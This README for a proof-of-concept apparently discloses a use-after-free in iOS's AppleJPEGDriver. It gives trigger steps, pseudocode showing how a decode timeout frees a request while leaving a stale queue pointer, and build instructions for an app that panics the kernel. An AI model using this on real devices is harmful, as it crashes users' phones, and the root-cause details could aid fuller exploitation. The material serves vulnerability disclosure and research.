# AppleJPEGDriver startDecoder() timeout UAF (deferred panic)

By [@zeroxjf](https://x.com/zeroxjf)

**This will kernel panic your device. Save your work.**

Tested on iOS 26.3 (23D125) on iPhone18,2 (A19 Pro).

## Trigger

Direct trigger:

1. Run the PoC and tap **Panic** (primes the driver / queues async work).
2. Then open **Camera** (this reliably causes a sync JPEG decode + timeout on the affected build).
3. The timeout path frees a request but leaves its embedded queue node pointer in the per-codec vector.
4. A later queue walk dereferences the stale node and the kernel panics (MTE tag check fault).

```c
// PoC: primes the driver; panic is usually deferred until Camera is opened.
IOServiceOpen("AppleJPEGDriver");
for (int i = 0; i < N; i++) {
  startDecoder_async();                   // queue_io_gated(): vector.push(req + 0x78)
}
IOServiceClose(conn);

// Later, opening Camera triggers:
startDecoder_sync();
  queue_io_gated(): vector.push(req + 0x78);
  wait(10s) -> TIMEOUT;
  pool_free(req);                         // BUG: does NOT dequeue (req + 0x78)

// Later still (finish_io_gated):
fullSpeedRequestExist():
  node_ptr = vector[i];                   // stale: node_ptr == (freed req + 0x78)
  req2 = *(node_ptr + 0x8);               // UAF read of req+0x80 -> MTE tag fault -> panic
```

## Build & Run

1. Open `ios-app/Test.xcodeproj` in Xcode
2. Select your iOS device (simulator is not useful)
3. Build and run
4. Tap the **Panic** button
5. Open the **Camera** app to trigger the deferred panic
